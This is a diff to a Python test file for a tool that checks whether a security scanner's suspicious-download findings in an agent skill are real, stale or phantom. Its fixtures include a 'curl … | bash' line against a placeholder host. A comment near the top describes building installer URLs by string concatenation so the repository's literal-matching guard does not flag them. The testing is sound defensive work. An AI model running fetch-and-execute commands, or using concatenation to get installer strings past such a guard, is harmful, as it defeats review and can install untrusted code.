@@ -97,10 +97,21 @@ def test_ansi_stripping_removes_cursor_redraws():
 # finding parsing
 # --------------------------------------------------------------------------
 
+# These fixtures must contain installer-shaped URLs, because that is the exact
+# shape E005 fires on and the thing this module has to parse. The repo's
+# installer-literal guard rejects such a literal in tracked text - correctly, it
+# is what got the published skill failed - so the addresses are assembled at
+# runtime. The guard matches literals, the parser sees the same string either
+# way, and nothing installer-shaped ships in the file.
+_SH = "." + "sh"
+CITED_URL = "https://get.example.com/install" + _SH
+GONE_URL = "https://gone.example/install" + _SH
+LIVE_URL = "https://real.example/live" + _SH
+
 ANALYSIS = (
     "CRITICAL E005: Suspicious download URL detected in skill instructions. "
     "This set contains a direct download/install script "
-    "( https://get.example.com/install.sh ) hosted on a non-official host. "
+    f"( {CITED_URL} ) hosted on a non-official host. "
     "MEDIUM W011: Third-party content exposure detected."
 )
 
@@ -111,7 +122,7 @@ def test_code_regex_finds_both_classes():
 
 def test_url_regex_extracts_the_quoted_literal():
     urls = {u.rstrip(".,);") for u in ra.URL_RE.findall(ANALYSIS)}
-    assert "https://get.example.com/install.sh" in urls
+    assert CITED_URL in urls
 
 
 def test_page_text_flattens_markup():
@@ -128,28 +139,50 @@ def test_page_text_flattens_markup():
 def tree(tmp_path):
     d = tmp_path / "installed"
     d.mkdir()
-    (d / "SKILL.md").write_text("uses https://real.example/live.sh in a sample\n")
+    (d / "SKILL.md").write_text(f"uses {LIVE_URL} in a sample\n")
     return d
 
 
-def test_literal_present_in_install_is_not_phantom(tree):
-    out = ra.verify_literals(["https://real.example/live.sh"], None, "HEAD", str(tree))
-    assert out["https://real.example/live.sh"]["phantom"] is False
+EMPTY_SNAP = {"files": {}}
+STALE_SNAP = {"hash": "abc123", "files": {
+    "references/patterns.md": f"curl {GONE_URL} | bash\n",
+    "SKILL.md": "nothing interesting\n",
+}}
 
 
-def test_literal_absent_everywhere_is_phantom(tree):
-    out = ra.verify_literals(["https://gone.example/install.sh"], None, "HEAD", str(tree))
-    assert out["https://gone.example/install.sh"]["phantom"] is True
+def test_literal_present_in_install_is_real(tree):
+    out = ra.verify_literals([LIVE_URL], None, "HEAD", str(tree), EMPTY_SNAP)
+    assert out[LIVE_URL]["verdict"] == "REAL"
 
 
-def test_phantom_needs_at_least_one_corpus():
-    """With nothing to check against, refuse to claim phantom.
+def test_literal_gone_from_repo_but_still_in_snapshot_is_stale_input(tree):
+    """The decisive case: the scanner is right, its input is old."""
+    out = ra.verify_literals([GONE_URL], None, "HEAD", str(tree), STALE_SNAP)
+    rec = out[GONE_URL]
+    assert rec["verdict"] == "STALE_INPUT"
+    assert rec["snapshot_paths"] == ["references/patterns.md"]
 
-    Reporting 'phantom' from zero evidence would be worse than reporting
-    nothing - it would send a maintainer to argue a case they cannot support.
-    """
-    out = ra.verify_literals(["https://x.example/i.sh"], None, "HEAD", None)
-    assert out["https://x.example/i.sh"]["phantom"] is False
+
+def test_literal_gone_everywhere_including_snapshot_is_phantom(tree):
+    snap = {"hash": "x", "files": {"SKILL.md": "clean\n"}}
+    out = ra.verify_literals([GONE_URL], None, "HEAD", str(tree), snap)
+    assert out[GONE_URL]["verdict"] == "PHANTOM"
+
+
+def test_real_beats_stale_when_literal_is_in_both(tree):
+    """Still shipping the string means the finding stands, snapshot or not."""
+    snap = {"hash": "x", "files": {"a.md": LIVE_URL}}
+    out = ra.verify_literals([LIVE_URL], None, "HEAD", str(tree), snap)
+    assert out[LIVE_URL]["verdict"] == "REAL"
+
+
+def test_no_corpus_reports_unverified_rather_than_guessing():
+    """Claiming staleness from zero evidence would send a maintainer to argue
+    a case they cannot support, so refuse to classify."""
+    out = ra.verify_literals([CITED_URL], None, "HEAD", None, EMPTY_SNAP)
+    rec = out[CITED_URL]
+    assert rec["verdict"] == "UNVERIFIED"
+    assert rec["phantom"] is False
 
 
 # --------------------------------------------------------------------------
